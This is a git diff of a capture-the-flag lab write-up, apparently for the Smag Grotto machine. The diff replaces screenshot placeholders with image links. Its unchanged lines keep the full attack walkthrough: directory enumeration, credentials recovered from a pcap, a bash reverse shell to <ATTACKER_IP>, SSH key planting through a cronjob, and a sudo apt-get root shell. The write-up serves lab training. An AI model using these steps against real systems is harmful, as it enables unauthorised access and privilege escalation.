@@ -14,7 +14,7 @@
 nmap <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="722" height="217" alt="SCREEN01" src="https://github.com/user-attachments/assets/680f3d20-12f2-4302-a9ec-0d2d14119ad0" />
 
 Enumerate web directories to discover hidden endpoints and files. Use gobuster with common wordlists
 
@@ -24,7 +24,7 @@ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-l
 
 The scan discovers a `/mail/` directory which may contain useful information
 
-[SCREEN02]
+<img width="723" height="409" alt="SCREEN02" src="https://github.com/user-attachments/assets/eba56e01-4a44-45a1-9880-62080f124012" />
 
 3. Navigate to `http://<TARGET_IP>/mail/` and download the file `dHJhY2Uy.pcap` for analysis
 
@@ -35,7 +35,7 @@ In the packet capture, we discover:
 - A subdomain: `development.smag.thm`
 - Credentials: `helpdesk:cH4nG3M3_n0w`
 
-[SCREEN03]
+<img width="801" height="580" alt="SCREEN03" src="https://github.com/user-attachments/assets/4e200263-ab08-47c7-95b6-597c77615a5a" />
 
 5. Add the discovered subdomain to the hosts file
 
@@ -63,7 +63,7 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
 cat /etc/crontab
 ```
 
-[SCREEN04]
+<img width="851" height="284" alt="SCREEN04" src="https://github.com/user-attachments/assets/c447f447-4321-40f0-958c-3e4c759300ce" />
 
 The crontab reveals a cronjob running as user `jake` that executes `/opt/.backups/jake_id_rsa.pub.backup` restoration script. This script copies SSH public keys from backup files
 
@@ -74,7 +74,7 @@ ssh-keygen -t rsa
 cat jake.pub
 ```
 
-[SCREEN05]
+<img width="617" height="362" alt="SCREEN05" src="https://github.com/user-attachments/assets/5d29670f-893b-4370-b920-efed6aa6db41" />
 
 11. Write your public SSH key to the backup location that the cronjob monitors. The cronjob will restore this key to jake's authorized_keys file.
 
@@ -90,7 +90,7 @@ ssh -i jake jake@<TARGET_IP>
 cat user.txt
 ```
 
-[SCREEN06]
+<img width="765" height="371" alt="SCREEN06" src="https://github.com/user-attachments/assets/b7165991-5a53-4879-99c2-bda8a4f7a954" />
 
 ---
 
@@ -102,7 +102,7 @@ cat user.txt
 sudo -l
 ```
 
-[SCREEN07]
+<img width="1111" height="94" alt="SCREEN07" src="https://github.com/user-attachments/assets/02e80bad-bf27-4438-919d-79ab18e272cf" />
 
 2. Check [GTFOBins](https://gtfobins.github.io/) for apt-get privilege escalation techniques. Exploit the sudo permission to spawn a root shell and retrieve the root flag
 
@@ -111,4 +111,4 @@ sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 cat /root/root.txt
 ```
 
-[SCREEN08]
+<img width="632" height="235" alt="SCREEN08" src="https://github.com/user-attachments/assets/b1962b83-6988-48e7-8bfb-4254f23bb7aa" />
